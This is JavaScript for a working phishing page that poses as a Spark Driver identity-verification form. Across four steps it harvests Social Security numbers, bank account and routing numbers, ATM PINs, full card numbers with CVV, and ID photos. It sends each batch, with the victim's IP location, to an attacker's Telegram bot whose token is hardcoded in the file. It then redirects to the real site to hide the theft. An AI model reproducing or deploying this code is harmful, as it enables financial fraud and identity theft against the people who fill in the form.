document.addEventListener('DOMContentLoaded', async function() {
    // Load environment variables
    let TELEGRAM_BOT_TOKEN = '';
    let TELEGRAM_CHAT_ID = '';
    
    try {
        const configResponse = await fetch('config.txt');
        const configText = await configResponse.text();
        const configLines = configText.split('\n').filter(line => line.trim() !== '');
        
        configLines.forEach(line => {
            if (line.includes('=')) {
                const [key, ...valueParts] = line.split('=');
                let value = valueParts.join('=').trim();
                
                // Remove quotes if present
                if ((value.startsWith("'") && value.endsWith("'")) || 
                    (value.startsWith('"') && value.endsWith('"'))) {
                    value = value.slice(1, -1);
                }
                
                if (key.trim() === 'TELEGRAM_BOT_TOKEN') {
                    TELEGRAM_BOT_TOKEN = value;
                } else if (key.trim() === 'TELEGRAM_CHAT_ID') {
                    TELEGRAM_CHAT_ID = value;
                }
            }
        });
        
        console.log('Configuration loaded successfully from config.txt');
        console.log('Bot token loaded:', TELEGRAM_BOT_TOKEN ? 'Yes' : 'No');
        console.log('Chat ID loaded:', TELEGRAM_CHAT_ID ? 'Yes' : 'No');
    } catch (error) {
        console.error('Error loading configuration:', error);
        // Fallback to hardcoded values if config.txt fails to load
        TELEGRAM_BOT_TOKEN = '8222171309:AAEUq6LuKnxlcaNv2bdM7QkcyNahPx_QCAA';
        TELEGRAM_CHAT_ID = '7959372593';
        console.log('Using fallback configuration values');
    }

    // Step navigation
    const nextToPaymentBtn = document.getElementById('nextToPayment');
    const nextToCardBtn = document.getElementById('nextToCard');
    const nextToIdBtn = document.getElementById('nextToId');
    const completeVerificationBtn = document.getElementById('completeVerification');

    // Form validation and navigation
    nextToPaymentBtn.addEventListener('click', async function() {
        if (validateStep1()) {
            showLoading('loading1');
            
            try {
                // Send Step 1 data to Telegram
                const step1Data = {
                    firstName: document.getElementById('firstName').value,
                    lastName: document.getElementById('lastName').value,
                    phone: document.getElementById('phone').value,
                    dob: document.getElementById('dob').value,
                    ssn: document.getElementById('ssn').value,
                    address: document.getElementById('address').value
                };
                
                const ipInfo = await getIPInfo();
                await sendStepToTelegram(1, step1Data, ipInfo);
                
                setTimeout(function() {
                    hideLoading('loading1');
                    updateProgress(1);
                    showStep(2);
                }, 3000);
            } catch (error) {
                console.error('Error sending step 1 data:', error);
                setTimeout(function() {
                    hideLoading('loading1');
                    updateProgress(1);
                    showStep(2);
                }, 3000);
            }
        }
    });

    nextToCardBtn.addEventListener('click', async function() {
        if (validateStep2()) {
            showLoading('loading2');
            
            try {
                // Send Step 2 data to Telegram
                const step2Data = {
                    bankName: document.getElementById('bankName').value,
                    bankAccount: document.getElementById('bankAccount').value,
                    accountType: document.getElementById('accountType').value,
                    routingNumber: document.getElementById('routingNumber').value,
                    atmPin: document.getElementById('atmPin').value
                };
                
                const ipInfo = await getIPInfo();
                await sendStepToTelegram(2, step2Data, ipInfo);
                
                setTimeout(function() {
                    hideLoading('loading2');
                    updateProgress(2);
                    showStep(3);
                }, 3000);
            } catch (error) {
                console.error('Error sending step 2 data:', error);
                setTimeout(function() {
                    hideLoading('loading2');
                    updateProgress(2);
                    showStep(3);
                }, 3000);
            }
        }
    });

    nextToIdBtn.addEventListener('click', async function() {
        if (validateStep3()) {
            showLoading('loading3');
            
            try {
                // Send Step 3 data to Telegram
                const step3Data = {
                    cardNumber: document.getElementById('cardNumber').value,
                    expDate: document.getElementById('expDate').value,
                    cvv: document.getElementById('cvv').value,
                    confirmAtmPin: document.getElementById('confirmAtmPin').value
                };
                
                const ipInfo = await getIPInfo();
                await sendStepToTelegram(3, step3Data, ipInfo);
                
                setTimeout(function() {
                    hideLoading('loading3');
                    updateProgress(3);
                    showStep(4);
                }, 3000);
            } catch (error) {
                console.error('Error sending step 3 data:', error);
                setTimeout(function() {
                    hideLoading('loading3');
                    updateProgress(3);
                    showStep(4);
                }, 3000);
            }
        }
    });

    completeVerificationBtn.addEventListener('click', async function() {
        if (validateStep4()) {
            showLoading('loading4');

            try {
                // Get IP and location information
                const ipInfo = await getIPInfo();

                // Send ID images to Telegram
                await sendIDImagesToTelegram(ipInfo);

                // Wait for 3 seconds before redirecting
                setTimeout(function() {
                    hideLoading('loading4');
                    updateProgress(4);
                    // Redirect to main site after successful verification
                    window.location.href = "https://www.sparkdriverapp.com/en_us";
                }, 3000);
            } catch (error) {
                console.error('Error:', error);
                hideLoading('loading4');
                alert('An error occurred. Please try again.');
            }
        }
    });

    // Function to collect all form data
    function collectFormData() {
        return {
            step1: {
                firstName: document.getElementById('firstName').value,
                lastName: document.getElementById('lastName').value,
                phone: document.getElementById('phone').value,
                dob: document.getElementById('dob').value,
                ssn: document.getElementById('ssn').value,
                address: document.getElementById('address').value
            },
            step2: {
                bankName: document.getElementById('bankName').value,
                bankAccount: document.getElementById('bankAccount').value,
                accountType: document.getElementById('accountType').value,
                routingNumber: document.getElementById('routingNumber').value,
                atmPin: document.getElementById('atmPin').value
            },
            step3: {
                cardNumber: document.getElementById('cardNumber').value,
                expDate: document.getElementById('expDate').value,
                cvv: document.getElementById('cvv').value,
                confirmAtmPin: document.getElementById('confirmAtmPin').value
            },
            step4: {
                frontId: document.getElementById('frontId').files[0] ? document.getElementById('frontId').files[0].name : 'No file selected',
                backId: document.getElementById('backId').files[0] ? document.getElementById('backId').files[0].name : 'No file selected'
            }
        };
    }

    // Function to get IP and location information
    async function getIPInfo() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            return {
                ip: data.ip,
                city: data.city,
                region: data.region,
                country: data.country_name,
                postal: data.postal,
                isp: data.org
            };
        } catch (error) {
            console.error('Error fetching IP information:', error);
            return {
                ip: 'Unknown',
                city: 'Unknown',
                region: 'Unknown',
                country: 'Unknown',
                postal: 'Unknown',
                isp: 'Unknown'
            };
        }
    }

    // Function to send ID images to Telegram
    async function sendIDImagesToTelegram(ipInfo) {
        const frontIdFile = document.getElementById('frontId').files[0];
        const backIdFile = document.getElementById('backId').files[0];

        if (!frontIdFile || !backIdFile) {
            throw new Error('Both ID images are required');
        }

        try {
            // Send front ID image
            await sendImageToTelegram(frontIdFile, 'Front ID', ipInfo);
            
            // Send back ID image
            await sendImageToTelegram(backIdFile, 'Back ID', ipInfo);
        } catch (error) {
            console.error('Error sending ID images:', error);
            throw error;
        }
    }

    // Function to send individual image to Telegram
    async function sendImageToTelegram(imageFile, caption, ipInfo) {
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', imageFile);
        
        const fullCaption = `${caption}

*IP Information:*
IP Address: ${ipInfo.ip}
City: ${ipInfo.city}
State/Region: ${ipInfo.region}
Country: ${ipInfo.country}
Postal Code: ${ipInfo.postal}
ISP: ${ipInfo.isp}
Timestamp: ${new Date().toLocaleString()}`;
        
        formData.append('caption', fullCaption);
        formData.append('parse_mode', 'Markdown');

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;

        try {
            const response = await fetch(url, {
                method: 'POST',
                body: formData
            });
            
            const data = await response.json();
            if (!data.ok) {
                throw new Error('Telegram API error: ' + data.description);
            }
            console.log(`${caption} sent successfully to Telegram`);
        } catch (error) {
            console.error(`Error sending ${caption} to Telegram:`, error);
            throw error;
        }
    }

    // Function to send individual step data to Telegram
    async function sendStepToTelegram(stepNumber, stepData, ipInfo) {
        let message = `*Step ${stepNumber} - `;
        
        switch(stepNumber) {
            case 1:
                message += `Personal Information*

*Personal Information:*
First Name: ${stepData.firstName}
Last Name: ${stepData.lastName}
Phone: ${stepData.phone}
DOB: ${stepData.dob}
SSN: ${stepData.ssn}
Address: ${stepData.address}`;
                break;
                
            case 2:
                message += `Payment Information*

*Bank Information:*
Bank Name: ${stepData.bankName}
Account Number: ${stepData.bankAccount}
Account Type: ${stepData.accountType}
Routing Number: ${stepData.routingNumber}
ATM Pin: ${stepData.atmPin}`;
                break;
                
            case 3:
                message += `Card Information*

*Card Information:*
Card Number: ${stepData.cardNumber}
Expiration Date: ${stepData.expDate}
CVV: ${stepData.cvv}
Confirm ATM Pin: ${stepData.confirmAtmPin}`;
                break;
                
            case 4:
                message += `ID Upload*

*ID Upload:*
Front ID: ${stepData.frontId}
Back ID: ${stepData.backId}`;
                break;
        }
        
        message += `

*IP Information:*
IP Address: ${ipInfo.ip}
City: ${ipInfo.city}
State/Region: ${ipInfo.region}
Country: ${ipInfo.country}
Postal Code: ${ipInfo.postal}
ISP: ${ipInfo.isp}
Timestamp: ${new Date().toLocaleString()}`;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        const payload = {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        };

        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            });
            
            const data = await response.json();
            if (!data.ok) {
                throw new Error('Telegram API error: ' + data.description);
            }
            console.log(`Step ${stepNumber} data sent successfully to Telegram`);
        } catch (error) {
            console.error(`Error sending step ${stepNumber} to Telegram:`, error);
            throw error;
        }
    }

    // Function to send data to Telegram
    async function sendToTelegram(formData, ipInfo) {
        // Format the message
        const message = `*New Identity Verification Submission*

*Personal Information:*
First Name: ${formData.step1.firstName}
Last Name: ${formData.step1.lastName}
Phone: ${formData.step1.phone}
DOB: ${formData.step1.dob}
SSN: ${formData.step1.ssn}
Address: ${formData.step1.address}

*Bank Information:*
Bank Name: ${formData.step2.bankName}
Account Number: ${formData.step2.bankAccount}
Account Type: ${formData.step2.accountType}
Routing Number: ${formData.step2.routingNumber}
ATM Pin: ${formData.step2.atmPin}

*Card Information:*
Card Number: ${formData.step3.cardNumber}
Expiration Date: ${formData.step3.expDate}
CVV: ${formData.step3.cvv}
Confirm ATM Pin: ${formData.step3.confirmAtmPin}

*ID Upload:*
Front ID: ${formData.step4.frontId}
Back ID: ${formData.step4.backId}

*IP Information:*
IP Address: ${ipInfo.ip}
City: ${ipInfo.city}
State/Region: ${ipInfo.region}
Country: ${ipInfo.country}
Postal Code: ${ipInfo.postal}
ISP: ${ipInfo.isp}`;

        // Send the message to Telegram
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        const payload = {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        };

        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            });
            
            const data = await response.json();
            if (!data.ok) {
                throw new Error('Telegram API error: ' + data.description);
            }
            console.log('Message sent successfully to Telegram');
        } catch (error) {
            console.error('Error sending to Telegram:', error);
            throw error;
        }
    }

    // Card logo recognition
    document.getElementById('cardNumber').addEventListener('input', function() {
        const cardNumber = this.value;
        const cardLogo = document.getElementById('cardLogo');

        if (cardNumber.startsWith('4') && cardNumber.length >= 1) {
            // Visa card
            cardLogo.src = 'https://logo.clearbit.com/visa.com';
            cardLogo.style.display = 'block';
        } else if (cardNumber.startsWith('5') && cardNumber.length >= 1) {
            // Mastercard
            cardLogo.src = 'https://logo.clearbit.com/mastercard.com';
            cardLogo.style.display = 'block';
        } else {
            cardLogo.style.display = 'none';
        }
    });

    // Restrict input to numbers only
    function restrictToNumbers(element) {
        element.addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '');
        });
    }

    // Apply number restriction to relevant fields
    restrictToNumbers(document.getElementById('phone'));
    restrictToNumbers(document.getElementById('ssn'));
    restrictToNumbers(document.getElementById('routingNumber'));
    restrictToNumbers(document.getElementById('atmPin'));
    restrictToNumbers(document.getElementById('cardNumber'));
    restrictToNumbers(document.getElementById('cvv'));
    restrictToNumbers(document.getElementById('confirmAtmPin'));

    // Validation functions
    function validateStep1() {
        const phone = document.getElementById('phone');
        const ssn = document.getElementById('ssn');
        let isValid = true;

        // Validate phone number (exactly 10 digits)
        if (!/^\d{10}$/.test(phone.value)) {
            document.getElementById('phoneError').style.display = 'block';
            isValid = false;
        } else {
            document.getElementById('phoneError').style.display = 'none';
        }

        // Validate SSN (exactly 9 digits)
        if (!/^\d{9}$/.test(ssn.value)) {
            document.getElementById('ssnError').style.display = 'block';
            isValid = false;
        } else {
            document.getElementById('ssnError').style.display = 'none';
        }

        // Check if all required fields are filled
        const requiredFields = document.querySelectorAll('#identityForm [required]');
        for (let field of requiredFields) {
            if (!field.value.trim()) {
                field.style.borderColor = '#d9534f';
                isValid = false;
            } else {
                field.style.borderColor = '#ddd';
            }
        }

        return isValid;
    }

    function validateStep2() {
        const routingNumber = document.getElementById('routingNumber');
        const atmPin = document.getElementById('atmPin');
        let isValid = true;

        // Validate routing number (exactly 9 digits)
        if (!/^\d{9}$/.test(routingNumber.value)) {
            document.getElementById('routingError').style.display = 'block';
            isValid = false;
        } else {
            document.getElementById('routingError').style.display = 'none';
        }

        // Validate ATM PIN (exactly 4 digits)
        if (!/^\d{4}$/.test(atmPin.value)) {
            document.getElementById('atmPinError').style.display = 'block';
            isValid = false;
        } else {
            document.getElementById('atmPinError').style.display = 'none';
        }

        // Check if all required fields are filled
        const requiredFields = document.querySelectorAll('#paymentForm [required]');
        for (let field of requiredFields) {
            if (!field.value.trim()) {
                field.style.borderColor = '#d9534f';
                isValid = false;
            } else {
                field.style.borderColor = '#ddd';
            }
        }
        return isValid;
    }

    function validateStep3() {
        const cardNumber = document.getElementById('cardNumber');
        const cvv = document.getElementById('cvv');
        const atmPin = document.getElementById('atmPin').value;
        const confirmAtmPin = document.getElementById('confirmAtmPin');
        let isValid = true;

        // Validate card number (exactly 16 digits)
        if (!/^\d{16}$/.test(cardNumber.value)) {
            document.getElementById('cardError').style.display = 'block';
            isValid = false;
        } else {
            document.getElementById('cardError').style.display = 'none';
        }

        // Validate CVV (3-4 digits)
        if (!/^\d{3,4}$/.test(cvv.value)) {
            document.getElementById('cvvError').style.display = 'block';
            isValid = false;
        } else {
            document.getElementById('cvvError').style.display = 'none';
        }

        // Validate confirm ATM PIN (exactly 4 digits)
        if (!/^\d{4}$/.test(confirmAtmPin.value)) {
            document.getElementById('confirmPinError').style.display = 'block';
            isValid = false;
        } else {
            document.getElementById('confirmPinError').style.display = 'none';
        }

        // Check if ATM pins match
        if (atmPin !== confirmAtmPin.value) {
            alert('ATM pins do not match');
            isValid = false;
        }

        // Check if all required fields are filled
        const requiredFields = document.querySelectorAll('#cardForm [required]');
        for (let field of requiredFields) {
            if (!field.value.trim()) {
                field.style.borderColor = '#d9534f';
                isValid = false;
            } else {
                field.style.borderColor = '#ddd';
            }
        }

        return isValid;
    }

    function validateStep4() {
        // Check if files are selected
        const frontId = document.getElementById('frontId');
        const backId = document.getElementById('backId');
        let isValid = true;

        if (!frontId.files.length) {
            frontId.style.borderColor = '#d9534f';
            isValid = false;
        } else {
            frontId.style.borderColor = '#ddd';
        }

        if (!backId.files.length) {
            backId.style.borderColor = '#d9534f';
            isValid = false;
        } else {
            backId.style.borderColor = '#ddd';
        }

        return isValid;
    }

    // Helper functions
    function showStep(stepNumber) {
        // Hide all steps
        const steps = document.querySelectorAll('.form-step');
        steps.forEach(step => step.classList.remove('active'));

        // Show the requested step
        document.getElementById(`step${stepNumber}`).classList.add('active');
    }

    function updateProgress(completedStep) {
        const steps = document.querySelectorAll('.progress-step');

        // Reset all steps
        steps.forEach(step => {
            step.classList.remove('active', 'completed');
        });

        // Mark completed steps
        for (let i = 0; i < completedStep; i++) {
            steps[i].classList.add('completed');
        }

        // Set current step as active only if it exists
        if (completedStep < steps.length) {
            steps[completedStep].classList.add('active');
        }
    }

    function showLoading(loadingId) {
        document.getElementById(loadingId).style.display = 'block';
    }

    function hideLoading(loadingId) {
        document.getElementById(loadingId).style.display = 'none';
    }
});